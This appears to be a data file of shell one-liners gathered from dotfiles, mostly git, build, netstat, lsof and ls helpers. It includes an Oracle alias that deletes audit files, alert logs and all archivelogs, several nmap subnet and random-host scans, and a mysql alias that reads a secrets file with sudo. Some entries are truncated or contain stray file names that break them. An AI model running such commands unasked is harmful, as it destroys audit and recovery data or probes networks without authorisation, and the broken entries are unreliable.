"open $(git remote get-url origin | sed ""s/^git@\(.*\)\.com:\(.*\)\.git$/https:\/\/\1.com\/\2/g"")"
"open $(git config remote.origin.url | sed ""s/git@\(.*\):\(.*\).git/https:\/\/\1\/\2/"")/tree/$(git symbolic-ref --quiet --short HEAD )/$(git rev-parse --show-prefix)"
"open $(git config remote.origin.url | sed ""s/git@\(.*\):\(.*\).git/https:\/\/\1\/\2/"")/tree/$(git symbolic-ref --quiet --short HEAD )"
"open $(git ci-status -v | awk ""{ print \$2 }"")"
"open $(echo ""https://github.com/FishkinsDC/donorschoose-web/compare/DonorsChoose:resolved...$(git curbranch)?expand=1&w=1"" | tee >(pbcopy))"
"open $(curl -X POST ""https://freehand-api.invisionapp.com/api/documents/create"" -s | jq "".url"" -r)"
"open ""https://github.com:/$(git remote -v | command ggrep -oP """
"open ""https://$(ghq list | peco)"""
"open ""`ls | tail -n 1`"""
"open ""`ls | head -n 1`"""
"open ""$(ls | mm -"
"open ""$(ls | mm "
"open ""$(ls | gshuf -n 1)"""
"open ""$(ls -t1 *| head -1)"""
"open ""$(find ~/Google\ Drive ~/Public ~/Pictures ~/Dropbox ~/Downloads ~/Documents ~/Desktop -type f|fzf)"""
"ompload ""$HOME/Music/`mpc --format %file% |head -n1`"""
"oldpwd=$(echo ""$DIRS"" | sed -ne "
"od -A n -v -t x1 | tr -d "" """
"od -A n -t x1 -v | sed -e ""s/ //g"""
"obxprop | grep ""^_OB_APP"""
"oapi && java -jar $(find ./target -name ""outbound-api-*-uberjar.jar"" | grep -v sources) server ~/src/my-config/ro-config/outbound-api-server-config_2.71.0.yml"
"oapi && java -jar $(find ./target -name ""outbound-api-*-uberjar.jar"" | grep -v sources) server ~/src/my-config/ro-config/outbound-api-server-config_2.60.0.yml"
"oapi && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar $(find ./target -name ""outbound-api-*-uberjar.jar"" | grep -v sources) server ~/src/my-config/ro-config/outbound-api-server-config_2.71.0.yml"
"oapi && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar $(find ./target -name ""outbound-api-*-uberjar.jar"" | grep -v sources) server ~/src/my-config/ro-config/outbound-api-server-config_2.60.0.yml"
"o=$ORACLE_SID ; rm -rf /u01/app/oracle/audit/CDB?/* ; date > /u01/app/oracle/diag/rdbms/cdb1/CDB1/trace/alert_CDB1.log ; for i in $(awk -F: ""/^[a-zA-Z0-9]+:/{print \$1}"" /etc/oratab | sort -u ) ; do . oraenv <<< $i ; rman target / <<< ""delete noprompt archivelog all;"" & done >/dev/null ; wait ; o=$ORACLE_SID"
"o ""$(rg --files -g ""*pdf"" | fzf)"""
"nvr -c ""cd $(pwd) | pwd"""
"nvm ls-remote --lts | grep --color=never ""Latest"""
"nvim"" | sudo tee -a /etc/bash.bashrc"
"nvim `git status -s | sed -ne ""s/^ M //p""`"
"nvim -c ""silent! call dein#update() | Capture Dein log"""
"nvim -c ""norm 12ggVjjjgc"" -c ""wq"" ~/.ssh/config && cat ~/.ssh/config | awk ""/switch/ {for(i=0; i<=3; i++) {getline; print}}"""
"nvim -S ""~/.vim/session/$(ls ~/.vim/session | fzf)"""
"nvim $(ag --follow --hidden --ignore .git -g """" $GOPATH/src/learn $GOPATH/src/db-github $GOPATH/src/proto | fzf)"
"nvim ""/home/rafael/Documentos/Notes/$(ls ~/Documentos/Notes/ | fzf)"""
"nvidia-smi | awk '/PID/ { seen=1 } seen {print} ' \
"nvidia-smi --query-gpu=temperature.gpu,clocks.current.sm,pstate,power.draw,utilization.gpu,utilization.memory,memory.free --format=csv | tail -n+2"
"nvidia-docker run -it -p 8890:8890/tcp --mount type=bind,source=""$(pwd)"",target=/data --mount type=bind,source=/home/aagnone/vimwiki/personal/academics/music/magenta,target=/opt/magenta --mount type=bind,source=""/media/aagnone/wd/corpora"",target=/corpora docker-tf jupyter-lab --no-browser --allow-root --ip=0.0.0.0 --port=8890 2>&1 | tee jup.txt"
"npx -q ips | lbl -e 'x=>{if(!x)return;x=JSON.parse(x);Object.keys(x).forEach(k=>console.log(x[k],k))}'"
"npm start 2>&1 | grep -P ""axel-starter((?!node_modules).)*"""
"npm list -g | grep ""^[├└]"""
"notify-send -i gnome-terminal ""[$?] $(tail -n1 $HISTFILE | sed -e ""s/^:\s*[0-9]\+:[0-9]\+;//"" -e ""s/;\s*gyr-alert-sh$//"")"""
"notify-send --urgency=normal --icon ${${?/0/terminal}//<->*/error} ""Command finished${${?/0/}//<->*/ with error}"" ${history[$HISTCMD]%[;&|]*}"
"nosetests omicia_pipeline integration_tests 2>&1 |grep -v ""^omicia_pipeline"""
"nosetests -v --log-config=python/ltu/saas/test_data/logging.conf --with-xunit --xunit-file=integration.xml -m ""(_test\.)|(test[^\.]*$)"" -a integration_test --no-skip ltu"
"norminette | grep -B 1 ""Error"""
"nodejs --use_strict niceware | tr "","" "" """
"node $(find . -name ""gulpfile.js"" -not -path ""./node_modules/*"" | head -n1)"
"nocorrect find . -iname ""*.py"" | xargs grep -rni"
"nocorrect find . -iname ""*.java"" | xargs grep -rni"
"nobuf cut -d""|"" -f4-"
"nmcli dev wifi | grep ""\*"""
"nmcli -t device status | cut -d"":"" -f1 && echo"
"nmcli -t -f active,ssid dev wifi | egrep ""^yes"""
"nmcli -f ssid,signal device wifi list | tr -s \"
"nmcli -f in-use,signal,ssid,bars,mode,security dev wifi | sort -n -k 1.3"
"nmap 10.254.233.0/24 -p8080 | grep -B4 ""tcp open"""
"nmap -sP 192.168.1.0/24; arp-scan --localnet | grep ""192.168.1.[0-9]* *ether"""
"nmap -sP $(tail -n 1 <(v4 | awk ""{print \$1}""))"
"nmap -n -iR 0 -sL | cut -d"" "" -f 2"
"nix-env -qsc | grep ""^[^=]*$"""
"nix-env -qaPA ""nixos.nodePackages"" | grep -i"
"nix-env -qaPA ""nixos.haskellPackages"" | grep -i"
"nice make -j $(grep ""processor"" /proc/cpuinfo | wc -l)"
"nginx -V 2>&1 | /bin/sed ""s: --:\n\t&:g"""
"next-review --user={{gerrit_username|default(""hughsaunders"")}}"
"networksetup -getmacaddress Ethernet | env grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"
"networksetup -getinfo Wi-Fi | grep ""IP address:"""
"netstat -tupl --numeric-ports | grep -E "":[0-9]+\s"""
"netstat -tup --numeric-ports | grep -E "":[0-9]+\s"""
"netstat -tulpn | grep "":$1"""
"netstat -tulpn | egrep -ve ""127.0.0.1"" -e ""p6"""
"netstat -tlee | grep ""8[0-9]\{3\}"""
"netstat -peanut | sort && echo -e ""\nTry command \033[32mnetstat-extra\033[0m for a detailed netstat check.\nTry command \033[32mnetstat-plus\033[0m for alot more to netstat..."""
"netstat -n | awk '/^tcp/ {s[\$NF]++} END{for(i in s) print i, s[i]}' OFS='\t'"
"netstat -n | awk '/^tcp/ {++S[\$NF]} END {for(a in S) print a, S[a]}'"
"netstat -lnp | grep -i ""listen"""
"netstat -lnp | grep "" LISTEN """
"netstat -l | grep ""LISTEN """
"netstat -atp tcp | grep -i \""listen\"""
"netstat -atp tcp | grep -i ""listen"" "
"netstat -ap tcp | grep -i ""listen"""
"netstat -antuwp | grep ""^tcp.*LISTEN"""
"netstat -anp tcp | grep ""LISTEN"""
"netstat -an |awk ""/^tcp/ {++S[$NF]} END {for (a in S) print a, S[a]}"""
"netstat -an | sed -n ""1,/Active UNIX domain sockets/ p"""
"netstat -an | grep ""LISTEN"""
"netstat -an | grep ""LISTEN """
"netstat -an | awk '/^tcp/ {++S[\$NF]} END {for(a in S) print a, S[a]}'"
"netstat -a -n | grep -i ""LISTEN """
"netstat --listen|grep ""[tu][cd]p"""
"netstat $NETSTAT_OPTIONS | egrep -ve ""p6"""
"netstat $NETSTAT_OPTIONS | egrep -ve ""127.0.0.1"" -e ""p6"""
"netctl list | grep ""*"""
"net stats server | grep -P -o ""[\d/]+.*M$"" --color=never"
"net statistics server | grep ""since"""
"neofetch --ascii ""$(fortune|cowthink -f bong -W 30)"""
"ncat bofh.jeffballard.us 666 </dev/null | sed -ne ""s/[^:]*: //p"""
"ncal -w | sed -E ""2,8s/ $(date +%e)/$(tput setaf 12)&$(tput sgr0)/"""
"nc pastebin.linxon.ru 9999 | xclip -selection ""clipboard"" && notify-send --urgency=low -i ""$([ $? = 0 ] && echo text-x-script)"" ""Сервер: pastebin.linxon.ru"" ""Ссылка была скопирована в буфер обмена..."""
"nc koeln.ccc.de 23 | cut -d \ -f 4,5"
"nars=\$(find nifi-nar-bundles/ -name '*.nar' |grep -v test);\
"nano /root/easyegais2/log/$(echo ""$(ls /root/easyegais2/log -t | grep -m1 "
"n=32; cow=$(cowsay ""moo""); for i in $(seq $n); do cow=$(echo ""$cow"" | cowsay -n); done; echo ""$cow"""
"mysql -h 127.0.0.1 -u root ""-p$(sudo cat /home/secrets/mysql.env | awk ""-F="" ""{print \$2}"")""'"
"mysql -e ""show engine innodb status\G"" | grep -C10 -i latest"
"mysql --disable-auto-rehash --skip-ssl --host=localhost --user=root --prompt=""\u@$(hostname)[\d]> "" --pager=""grcat /etc/mysql/grcat.config | less -RSFXin"""
"mygit_listbranch_who|grep ""Christopher Reitz"""
"mvn org.apache.maven.plugins:maven-help-plugin:3.1.1:evaluate -Dexpression=project.version | grep -v \""^\[\"""
"mvn javadoc:javadoc > javadocoutput.txt | grep "": error"""
"mvn dependency:tree | grep "":test"" > ""$(git symbolic-ref --short HEAD)-test.txt"""
"mvn dependency:tree | grep "":compile"" > ""$(git symbolic-ref --short HEAD)-compile.txt"""
"mvn dependency:tree -Dverbose | vim ""+set bt=nofile"" -"
"mvn clean install | tee /tmp/mvn-`date ""+%Y-%m-%d-%H-%M""`.log; terminal-notifier -message ""Build is done"" -title ""Maven"" -sound Frog"
"mvn clean install -U -Dgpg.skip=true -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i $MVN_ALL"
"mvn clean install -U -Dgpg.skip=true -P Atnv2-TU,gwt-dev,resources-dev 2>&1 | h -i error info warn debug caused atnv2 downloading building"
"mvn checkstyle:checkstyle -Dcheckstyle.output.format=plain -Dcheckstyle.output.file=$\{project.build.directory\}/checkstyle-result.txt -Dcheckstyle.failsOnError=true; cat `find . -name checkstyle-result.txt` | sed -e ""s/.*kiji-.*\///g"""
"mvn -o dependency:list |\
"mvn -T 1C clean install | tee /tmp/mvn-`date ""+%Y-%m-%d-%H-%M""`.log; terminal-notifier -message ""Build is done!"" -title ""Maven"" -sound Frog"
"mvn -T 1C clean install -DskipTests=true -Dmaven.site.skip=true -Dmaven.javadoc.skip=true | tee /tmp/mvn-`date ""+%Y-%m-%d-%H-%M""`.log; terminal-notifier -message ""Build is done!"" -title ""Maven"" -sound Frog"
"mvn -T 1C clean install -Dmaven.test.skip=true -DskipTests -Dmaven.site.skip=true -Dmaven.javadoc.skip=true | tee /tmp/mvn-`date ""+%Y-%m-%d-%H-%M""`.log; terminal-notifier -message ""Build is done!"" -title ""Maven"" -sound Frog"
"mvim -U ~/.gvimrc.fullscreen -p *.c -c ""tabdo vsp %<.h | windo set nowrap"""
"mv ~/Desktop/""$(ls -t ~/Desktop/| head -n1)"""
"mv ~/.mail/.notmuch{,.old} && notmuch new && ssh root notmuch dump | notmuch restore && rm -r ~/.mail/.notmuch.old"
"mv -i ~/Baixades/""$(ls -t1 ~/Baixades | head -n 1)"" ./"
"mv ""$HOME/Downloads/$(ls -tr ~/Downloads | tail -n 1)"" ."
"multitail -R 2 -l ""netstat -tp | grep ESTABLISHED"""
"mu view ""$MUID"" | "
"mu extract ""$MUID"" --parts=1 --overwrite --target-dir=/tmp && iconv -f iso-8859-1 -t utf-8 /tmp/1.part | pandoc -f html -t plain --reference-links"
"msgI ""Please click a window !!!"" ; xprop | grep ^WM_NAME"
"msgI ""Please click a window !!!"" ; xprop | grep WM_CLASS"
"mpv --wid=$(xprop -root _NET_ACTIVE_WINDOW | grep -oP ""(?<=# ).*"")"
"mpv --no-audio-display -playlist <(find ""$PWD"" -type f | shuf)"
"mpv ""$(ls | fzy)"""
"mplayer -wid $( xwininfo -root|perl -lne '@c=<>;$c[$.-47] =~
"mplayer -playlist <(find ""$PWD"" -type f | sort -n)"
"mplayer -playlist <(find ""$PWD"" -type f -iname ""*.mp3"" -o -iname ""*.ogg"" -o -iname ""*.flac"" | sort -n)"
"mplayer -fs $(echo ""http://youtube.com/get_video.php?$(curl -s $youtube_url | sed -n ""/watch_fullscreen/s;.*\(video_id.\+\)&title.*;\1;p"")"")"
"mplayer -fs $(echo ""http://youtube.com/get_video.php?$(curl -s ""$1"" | sed -n ""/watch_fullscreen/s;.*\(video_id.\+\)&title.*;\1;p"")"")"
"mplayer ""`ls -htr -1 | head -n1`"""
"mpc playlist | egrep -A 4 -B 4 "">[0-9]{1,5}.*"""
"mpc --format "".: %title% by %artist% #[%album%#] :."" | head -n1"
"mpc --format ""%title% - %artist% #[%album%#]"" | head -n1"
"mpc --format "" %title% by %artist% #[%album%#]"" | head -n1"
"mount |grep -q 242; if [ $? = 0 ];then sudo umount /media/x;fi;sudo smbmount //172.16.10.242/home/svn /media/x/ -o iocharset=utf8,dir_mode=0777,file_mode=0777,username=${MYUSERNAME}"
"mount | grep --color=never ""^/"""
"mount | column -t -N name,location,type,opts -H2,4"
"mount | column --table-columns DEVICE,STATUS,PATH,' ',TYPE,OPTIONS -o ' │ ' -t"
"mount -o remount,rw /system; mount | grep system"
"mount -o remount,ro /system; mount | grep system"
"more `pwd`/.log | egrep ""stdout"""
"more `pwd`/.log | egrep ""stderr"""
"more `pwd`/.log | egrep ""<#"""
"more `pwd`/.log | egrep ""#>"""
"more ; alias cls='stty sane ; stty dec -decctlq ; clear' ; alias df='df -H' ; alias du='du -k' ; alias e='emacs -nw' ; alias d='ls -al' ; alias dds='ls -Flao' ; alias fetch='curl -OR' ; alias h='history 28' ; echo ; echo df ; df ; echo ; date ; echo ; alias ; export DISPLAY=${emuDIS} ; echo DISPLAY=\$DISPLAY ; export TERM=xterm-256color ; resize"" | pbcopy -"
"module -t av |& grep -v ""/$"""
"mockgen $(pwd | sed ""s:$GOPATH/src/::"")"
"mkdocs serve --dev-addr=` hostname -i | cut -d"" "" -f 1`:8000"
"mkdir -p ~/tmp/trash ; find . -name ""*.sw*"" | while read f ; do echo Move $f to trash ; mv $f ~/tmp/trash ; done"
"mkdir -p V0 && for file in *.flac; do $(flac -cd ""$file"" | lame -V0 --vbr-new - ""V0/${file%.flac}.mp3""); done"
"mkdir -p /Users/dcardoza/Dropbox/Journal/$(date +%Y)/; vim + ""/Users/dcardoza/Dropbox/Journal/$(date +%Y)/$(date +%Y-%m-%d).md"" -c ""execute \""normal! Go$(date +%r)\<CR>========\<CR>\"" | startinsert """
"mkdir -p $(date -I | tr ""-"" ""/"")"
"mkdir $(date ""+%F %T"" | perl -pe ""s#\\D##g;s#.{6}\$#.\$&#"")"
"mkcs50"" | cat >> ~/.bashrc"
"milestoner --commits | _copy_and_print ""\n"""
"mergecap ~/.pcaps/*.pcapng(.rm-1) -w - | tshark -r - -qz io,phs"
"mergecap ~/.pcaps/*.pcapng(.om[1]) -w - | tshark -r - -qz io,phs"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.15.1.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.13.6.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.71.0.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.70.0.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.60.0.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.51.0.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.50.1.yml"
"mds && java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xms256m -Xmx2048m -XX:PermSize=512m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.50.0.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.15.1.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.13.6.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.71.0.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.70.0.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.60.0.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.51.0.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.50.1.yml"
"mds && java -Xms256m -Xmx2048m -cp $(find reference-data-service/target -name ""reference-data-service-*-uberjar.jar"" | grep -v sources) com.redowlanalytics.reference.ReferenceDataService server ~/src/my-config/ro-config/mds-server-config_2.50.0.yml"
"mdls -name kMDItemFSName -name kMDItemDateAdded -raw err.txt generated.file succ.txt | \
"mdfind -onlyin ~ ""*"" | fzf"
"mdfind -onlyin . -name ""swift"" | xargs sed -i """" -e ""$a\"""
"mdfind ""kMDItemAppStoreHasReceipt=1"" | sort"
"md5sum -c ""${PWD/*\//}.md5"" | egrep -v "": OK$"""
"man ps | grep -A18 ""^PROCESS STATE CODES$"""
"man bash | sed -n '/^SHELL BUILTIN COMMANDS/,/^RESTRICTED SHELL/p'"
"man bash | sed -n '/^CONDITIONAL EXPRESSIONS/,/^SIMPLE COMMAND/p'"
"man bash # Go to line number: ""man bash | less +1377"""
"man -t ""$@"" | open -g -f -a /Applications/Preview.app"
"man $(fc -ln -1 | cut -d"" "" -f 1)"
"man ""$1"" | less -p ""$2"""
"makepasswd --chars=12 --string="".,;+[]@#1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"" | xclip -selection c"
"makepasswd --chars 12 --string 'abcdefghijklmnopqrrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+*%_-=.,!|/~'"
"make"" | cat >> ~/.bashrc"
"make fclean ; find . \( -name ""#*#"" -o -name ""*~"" -o -name "".~lock.*"" -o -name "".#*"" -o -name ""*.o"" -o -name ""a.out*"" -o -name "".DS_Store"" -o -name "".vim"" -o -name "".viminfo"" -o -name ""pgadmin.log"" \) | xargs rm -rf ; mv ~/*scrot* ~/Pictures ; clear ; la"
"make fclean ; find . \( -name ""#*#"" -o -name ""*~"" -o -name ""*.dSYM"" -o -name "".~lock.*"" -o -name "".#*"" -o -name ""*.o"" -o -name ""a.out*"" -o -name "".DS_Store"" -o -name "".vim"" -o -name "".viminfo"" -o -name ""pgadmin.log"" \) | xargs rm -rf ; clear ; ll"
"make bootstrap 2>&1 | grep ""error"""
"make bootstrap 2>&1 | grep ""No such"""
"make -rnd | perl -p -e 's,(^ +),\1\1\1\1,'"
"make -j$(fgrep processor /proc/cpuinfo | wc -l)"""
"make -j$(echo ""scale=0;$(nproc)*1.5/1"" | bc)"
"make -j $(python3 -c ""import multiprocessing as mp; print(int(mp.cpu_count() err.txt generated.file succ.txt 1.5))"") |& tee build.log"
"make -Rr -j 8 -C `pwd | cut -d ""/"" -f 1,2,3,4,5`"
"make ""$@"" 2>&1 | less"
"maim -st 1 | convert - -resize 1x1\! -format ""%[pixel:p{0,0}]"" info:-"
"maim -st 0 | convert - -resize 1x1\! -format '%[pixel:p{0,0}]' info:-"
"maim -s -p 1 -c 1,0,0,0.5 --nokeyboard --format=png /dev/stdout | xclip -selection c -t image/png"
"mailq |lgrep -E ""^[0-9A-F]*!"""
"mailq Go ""^\w+""|postsuper -d -"
"lt -n |grep"""
"lt --color=always -lht | command grep ""^d"""
"lt --color=always -lht | command grep ""^-"""
"lst ""CLICOLOR_FORCE=1 ls -la | grep --color=never ^d"" ""dir"""
"lst ""CLICOLOR_FORCE=1 ls -la | grep --color=never ^-"" ""file"""
"lsof | grep ""(deleted)$"""
"lsof -nP | egrep "" TCP """
"lsof -i4 -s TCP:LISTEN -n | awk '/^ssh/{print \$(NF-1),\$2}'"
"lsof -i | grep -E ""(LISTEN)"""
"lsof -i | grep -E ""(ESTABLISHED)"""
"lsof -i | grep -E ""(CLOSED)"""
"lsof -i -nP | grep ""(LISTEN)"""
"lsof -i -P|grep -i ""listen"""
"lsof -i -P | grep -i ""listen"""
"lsof -i -P | grep -i ""LISTEN"""
"lsof -i -P | grep ""LISTEN"""
"lsof -i -P +c 0 +M | grep -i ""$1"""
"lsof -i "":$1"" | grep LISTEN"
"lsblk -o NAME,FSTYPE,SIZE,STATE,TYPE,MOUNTPOINT |grep -v loop"
"lsblk -o HOTPLUG,NAME,LABEL,MOUNTPOINT,SIZE,MODEL,PARTLABEL,TYPE | grep -v loop"
"lsattr -a 2>/dev/null | grep -vE ""[-Ie]{18}"""
"lsa -al | grep --color=never ""^d"""
"ls_() { ls -AFLl ""$@"" | sort -k 1,1r -k 9,9; }; ls_"
"ls ~/Development/mozlocal/apps | xargs -n1 -I{} bash -c ""echo "
"ls | xargs -n 1 -I{} sh -c ""cd {} && sudo pacman -U *.pkg.tar.xz --noconfirm && cd .."""
"ls | xargs -I {} sh -c ""cd {} && git pull"""
"ls | xargs -I % sh -c ""echo %; loc %; echo"""
"ls | tr ""\t"" ""\n"""
"ls | tr "" "" \n\t"
"ls | sed ""s:^:`pwd`/:"""
"ls | sed ""s:^:`pwd`/: """
"ls | grep -v ""^l"""
"ls | grep -v ""/$"""
"ls | grep -n """""
"ls | grep ""^d"""
"ls | grep ""\/$"""
"ls | grep ""[^~*]$"""
"ls | grep "".sh"""
"ls | fzf --preview=""head -n 20 {}"""
"ls | fzf --preview=""head -n 10 {}"""
"ls | fzf --preview ""cat {}"""
"ls | egrep -i ""$@"""
"ls | egrep ""/"""
"ls | egrep ""$@"""
"ls | dmenu -fn ""-*-anorexia-medium-*-*-*-11-*-*-*-*-*-*-*"" -nb ""#101010"" -nf ""#b9c0af"" -sb ""#101010"" -sf ""#afff2f"""
"ls | cat ~/.obiwan && echo && echo \""THESE ARE NOT THE FILES YOU ARE LOOKING FOR\"" && echo && ls"
"ls | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls ls='ls --color' lsd='""ls"" --color=always -Acr | tail -n 5' l='ls -l --color'\"
"ls SCCS/s.* | sed ""s/.*\/s.//"" `"
"ls RCS/*,v | sed -e ""s/.*\///"" -e ""s/,v//"""
"ls /etc/apt/sources.list.d/ | grep --color=never ""list$"""
"ls ./. ./.. -alrt |grep ""[^^]./\..*$"""
"ls -tl `find . -regex "".*node_modules.*"" -name ""*.js"" -type f -print` | head -20"
"ls -td $(find . -type f) | sed ""s#^\.\/##"""
"ls -tc1 $TTDDIR | grep -v ""Icon*"""
"ls -p | grep -v ""/$"""
"ls -p | grep -v ""/"""
"ls -p | grep ""/$"""
"ls -p | grep ""/"""
"ls -ohA --color=never | grep --color=never ""^d"""
"ls -l|grep ""^d"""
"ls -l| egrep ""^d"""
"ls -lvF --color | grep -e ""^d"" --color=never"
"ls -ltrsa ""$@"" | tail"
"ls -ltr ""$@"" --color=always | tail -n 10"
"ls -lth | grep ""^d"""
"ls -lt | head -12; echo """""
"ls -lt | head -12 ;echo """""
"ls -lt | cut -d"" "" -f6-"
"ls -lsa | grep ""^d"""
"ls -lrt | egrep ""^d"""
"ls -lp | grep -v ""/"""
"ls -lp | grep ""/"""
"ls -lhrta |grep ""^d"" "
"ls -lhrta |grep ""^-"" "
"ls -lhd .??* | grep ""^-"""
"ls -lhaG --color=always | sed -re ""s/^[^.]* //"""
"ls -lhaF --color | grep ""\->"""
"ls -lhaF ${colorflag} | grep ""^d"""
"ls -lha | grep ""^l"""
"ls -lha | grep ""^d"""
"ls -lha | grep ""^\-"""
"ls -lha --group-directories-first | grep --color=""never"" ""^d"""
"ls -lha --group-directories-first | grep --color=""never"" ""^[^d]"""
"ls -lha --color=always -F --group-directories-first | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -lhS | cut -d"" "" -f5-"
"ls -lhGa --color=always | sed -re ""s/^[^ ]* //"""
"ls -lhG | grep ""^d"""
"ls -lhFGh | cut -c 2-11,27-34,48-"
"ls -lhF | grep --color=never ""^d"""
"ls -lhF ${colorflag} | grep ""^d"""
"ls -lhA | grep -v ""^d"""
"ls -lhA | grep ""^d"""
"ls -lh |grep -v ""~"" "
"ls -lh | grep ""^l"""
"ls -lh | grep ""^d"""
"ls -lh | grep ""^-"""
"ls -lh | egrep -v ""^d"""
"ls -lh *(s,S) | head"
"ls -lh ${colourflag} | grep ""^d"""
"ls -lh ${colorflag} | grep ""^d"""
"ls -lgr | grep ""^d"""
"ls -lfh **/*~*.(sof|gem)(.OL[1,10])"
"ls -ldfh -- */ && ls -lafh | grep -v ""^d"""
"ls -ld . .. | grep ""^d"""
"ls -ld . .. | grep ""^-"""
"ls -ld err.txt generated.file succ.txt | grep ""^d"""
"ls -ld $(echo $PATH | tr : ""\n"")"
"ls -lct $(find . -type f -iname ""*"") | less"
"ls -latr | grep ""^d"""
"ls -latr | egrep ""^d"""
"ls -lahs |\grep -E '^\s*([0-9,]+G)'"
"ls -lahd $(ls -a | grep ""^\."")"
"ls -lahG | cut -c 2-10,18-23,36-"
"ls -lahF --color=auto | less -R""
"ls -lah | grep ""^d"""
"ls -lah | awk '{k=0;s=0;for(i=0;i<=8;i++){;k+=((substr(\$1,i+2,1)~/[rwxst]/)*2^(8-i));};j=4;for(i=4;i<=10;i+=3){;s+=((substr(\$1,i,1)~/[stST]/)*j);j/=2;};if(k){;printf(\"
"ls -lah --color | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -ladh (\.*|*)(/,@)"
"ls -laR|grep -c ""^-"""
"ls -laF | grep ""^d"""
"ls -laF | fgrep ""*"""
"ls -laF | awk '
"ls -laF | awk ""\$5==0 {print \$0}"""
"ls -laF | awk ""\$5!=0 {print \$0}"""
"ls -laF -G | grep ""^d"""
"ls -laF ${colorflag} | grep ""^d"""
"ls -la | grep -E ""^[^f]"""
"ls -la | grep ""^d"""
"ls -la | grep ""\/$"""
"ls -la | grep "" \\."""
"ls -la | grep "" \..*"""
"ls -la | grep "" \."""
"ls -la | egrep ""^d"""
"ls -la | egrep ""^\."""
"ls -la | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -la | awk '
"ls -la | awk ""{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\""%0o \"",k);print}"""
"ls -la | ack ""\-\>"""
"ls -la . | grep ""\->"""
"ls -la --color | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -la ${colorflag} | grep ""^d"""
